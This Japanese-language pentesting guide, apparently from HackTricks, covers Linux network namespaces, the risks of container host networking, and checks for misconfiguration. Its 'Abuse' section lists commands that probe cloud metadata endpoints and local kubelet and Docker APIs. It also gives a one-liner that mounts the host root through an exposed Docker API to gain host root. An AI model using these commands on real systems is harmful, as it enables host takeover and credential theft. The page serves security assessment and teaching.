# ネットワーク名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

ネットワーク名前空間は、インターフェース、IPアドレス、ルーティングテーブル、ARP/ネイバー状態、ファイアウォールルール、ソケット、`/proc/net` のようなファイルの内容など、ネットワーク関連のリソースを分離します。これにより、コンテナはホストの実際のネットワークスタックを所有していなくても、自分専用の `eth0`、ローカルルート、ループバックデバイスを持っているように見えることがあります。

セキュリティの観点では、ネットワーク分離はポートバインディング以上の意味を持つため重要です。プライベートなネットワーク名前空間は、ワークロードが直接観察したり再構成したりできる範囲を制限します。その名前空間がホストと共有されると、コンテナは突然ホストのリスナー、ホストローカルサービス、アプリケーションに公開されるべきではないネットワーク制御ポイントを可視化できるようになる可能性があります。

## 動作

新しく作成されたネットワーク名前空間は、インターフェースがアタッチされるまで空かほぼ空のネットワーク環境で始まります。コンテナランタイムはその後、仮想インターフェースを作成または接続し、アドレスを割り当て、ルートを設定してワークロードに期待される接続を提供します。bridge-based のデプロイでは、通常コンテナはホストブリッジに接続された veth-backed インターフェースを見ます。Kubernetes では CNI プラグインが Pod ネットワーキングの同等のセットアップを処理します。

このアーキテクチャは、`--network=host` や `hostNetwork: true` がなぜこれほど劇的な変化なのかを説明します。準備されたプライベートなネットワークスタックを受け取る代わりに、ワークロードはホストの実際のスタックに参加します。

## 演習

ほぼ空のネットワーク名前空間は次の方法で確認できます:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
また、通常のコンテナとホストネットワーク化されたコンテナを次のように比較できます:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Runtime Usage

Docker と Podman は通常、設定がない限り各 container ごとに private network namespace を作成します。Kubernetes は通常各 Pod に専用の network namespace を割り当て、Pod 内の container で共有されますが host とは分離されています。Incus/LXC システムも network-namespace ベースの隔離機能を豊富に提供しており、多様な仮想ネットワーク構成を扱えます。

一般的な原則は、private networking がデフォルトの隔離境界であり、host networking はその境界から明示的にオプトアウトする設定だということです。

## Misconfigurations

最も重要な misconfiguration は単純に host network namespace を共有してしまうことです。これはパフォーマンス向上、低レベルのモニタリング、あるいは利便性のために行われることがありますが、container にとって利用可能ないちばん明確な境界の一つを取り除いてしまいます。Host-local な listeners がより直接的に到達可能になり、localhost 専用のサービスにアクセスできるようになることがあり、`CAP_NET_ADMIN` や `CAP_NET_RAW` のような capabilities は、これらが有効にする操作が host 自体のネットワーク環境に対して行われるため、はるかに危険になります。

別の問題は、network namespace が private であってもネットワーク関連の capabilities を過剰に付与してしまうことです。private namespace は助けになりますが、raw sockets や高度なネットワーク制御を無害にするわけではありません。

## Abuse

隔離が弱い環境では、攻撃者は host の listening サービスを調べたり、loopback にのみバインドされた管理エンドポイントに到達したり、具体的な capabilities や環境次第でトラフィックをスニッフィング／妨害したり、`CAP_NET_ADMIN` があると routing や firewall の状態を再構成したりする可能性があります。クラスタ環境では、これにより lateral movement や control-plane の偵察が容易になることもあります。

If you suspect host networking, start by confirming that the visible interfaces and listeners belong to the host rather than to an isolated container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services はしばしば最初に興味深い発見となる:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
ネットワーク機能がある場合、ワークロードが表示されているスタックを検査または変更できるかをテストする:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
クラスターやクラウド環境では、ホストのネットワーキングにより、メタデータやコントロールプレーンに隣接するサービスのローカルでの迅速なreconも正当化されます:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完全な例: Host Networking + Local Runtime / Kubelet Access

Host networking は自動的に host root を提供するわけではありませんが、しばしばノード自身からのみ到達可能なよう意図的に公開されているサービスを露出します。これらのサービスのいずれかが保護が甘い場合、Host networking は直接的な privilege-escalation の経路になります。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost上のKubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影響:

- 適切な保護なしにローカルのランタイムAPIが公開されている場合、ホストが直接侵害される可能性がある
- kubelet やローカルエージェントに到達可能な場合、クラスタの偵察や横移動が行われる可能性がある
- `CAP_NET_ADMIN` と組み合わされると、トラフィックの改ざんやサービス拒否が発生する可能性がある

## チェック

これらのチェックの目的は、プロセスがプライベートなネットワークスタックを持っているか、どのルートとリスナーが見えているか、そして capabilities を実際にテストする前にネットワークの見え方がすでにホストに似ているかどうかを把握することです。
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- namespace identifier や表示されるインターフェースのセットがホストと同じに見える場合、host networking が既に使われている可能性があります。
- `ss -lntup` は特に有用です。ループバック限定のリスナーやローカル管理用エンドポイントを明らかにします。
- ルート、インターフェース名、ファイアウォールのコンテキストは、`CAP_NET_ADMIN` または `CAP_NET_RAW` が存在する場合により重要になります。

コンテナをレビューする際は、必ず network namespace を capability set と合わせて評価してください。host networking と強力なネットワーク capability の組み合わせは、bridge networking と限定的なデフォルト capability set の組み合わせとはまったく異なる態勢です。
{{#include ../../../../../banners/hacktricks-training.md}}
